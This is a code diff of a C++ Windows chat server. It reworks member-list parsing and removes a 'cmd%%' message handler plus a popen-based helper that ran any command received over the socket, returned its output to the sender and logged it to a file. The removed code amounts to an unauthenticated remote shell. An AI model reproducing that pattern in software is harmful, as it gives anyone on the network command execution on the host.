@@ -173,7 +173,6 @@ int main(int argc, char *argv[]) {
 	return 0;
 }
 
-std::pair<std::string, bool> getCmdResult(const std::string& command);
 
 void replaceAll(std::string& str, const std::string &oldSubstr, const std::string &newSubstr) {
 	size_t pos = 0;
@@ -208,7 +207,7 @@ void HandleClient(SOCKET clientSocket) {
 
 
 
-		
+
 		std::string recv_text = Utf8ToAnsi(std::string(message));
 
 		std::cout << recv_text << std::endl;
@@ -216,39 +215,17 @@ void HandleClient(SOCKET clientSocket) {
 
 
 		if(std::string(message).find("@@@Joined the server@@@")==0) {
-			Member_List+="//"+std::string(message).substr(std::string("@@@Joined the server@@@").size()+2,std::string(message).rfind("//")-std::string("@@@Joined the server@@@").size()-2);
+			Member_List+="//"+std::string(message).substr(std::string(message).find("//")+2,std::string(message).find("//",std::string(message).find("//")+2)-std::string(message).find("//")-2);
 		}
 		if(std::string(message).find("@@@Exit the server@@@")==0) {
 
-			replaceAll(Member_List,"//"+std::string(message).substr(std::string("@@@Exit the server@@@").size()+2,std::string(message).rfind("//")-std::string("@@@Exit the server@@@").size()-2),"");
+			replaceAll(Member_List,"//"+std::string(message).substr(std::string(message).find("//")+2,std::string(message).find("//",std::string(message).find("//")+2)-std::string(message).find("//")-2),"");
 		}
 		if(std::string(message)=="list") {
 //			replaceAll(Member_List,"////","//");
 			std::cout<<"list%%"<<Member_List.substr(2,Member_List.size()-2)<<std::endl;
 			send(clientSocket,("list%%"+Member_List.substr(2,Member_List.size()-2)).c_str(),("list%%"+Member_List.substr(2,Member_List.size()-2)).size(),0);
 
-			continue;
-		}
-		if(std::string(message).find("cmd%%")==0) {
-			std::string command=std::string(message).substr(5,std::string(message).find("//")-5);
-			if(command.find("cd")==0&&command.size()>2) {
-				SetCurrentDirectory(command.substr(3,command.size()-3).c_str());
-				send(clientSocket,("cmdre%%"+ANSIToUTF8(command.substr(3,command.size()-3))).c_str(),("cmdre%%"+ANSIToUTF8(command.substr(3,command.size()-3))).size(),0);
-			} else {
-				std::pair<std::string, bool> cmdresult=getCmdResult(command);
-				std::string recmd=cmdresult.first;
-				if(!cmdresult.second)recmd="'"+command+"' ExecuteFail";
-				send(clientSocket,("cmdre%%"+ANSIToUTF8(recmd)).c_str(),("cmdre%%"+ANSIToUTF8(recmd)).size(),0);
-			}
-
-			std::ofstream o_log("CMD_LOG.txt", std::ios::app);
-			std::string temp = Utf8ToAnsi(std::string(message));
-			replaceAll(temp, "\n", " %r%");
-			replaceAll(temp, "\r", "");
-			o_log << ANSIToUTF8(temp) << std::endl;
-			o_log.close();
-			
-			
 			continue;
 		}
 
@@ -287,28 +264,3 @@ void HandleClient(SOCKET clientSocket) {
 	printf("Closed client\n");
 }
 
-std::pair<std::string, bool> getCmdResult(const std::string& command) {
-    std::string result = "";
-    char buffer[128];
-
-    // 使用 popen 执行命令，并获取其输出
-    FILE* pipe = popen(command.c_str(), "r");
-    if (!pipe) {
-        std::cerr << "Error executing command: " << command << std::endl;
-        return std::make_pair(result, false);
-    }
-
-    // 逐行读取命令回显内容，并存储到结果字符串中
-    while (!feof(pipe)) {
-        if (fgets(buffer, 128, pipe) != nullptr) {
-            result += buffer;
-        }
-    }
-
-    int returnValue = pclose(pipe);
-
-    // 检查子进程的返回值，以确定命令是否有效
-    bool isValidCommand = (returnValue == 0);
-    
-    return std::make_pair(result, isValidCommand);
-}
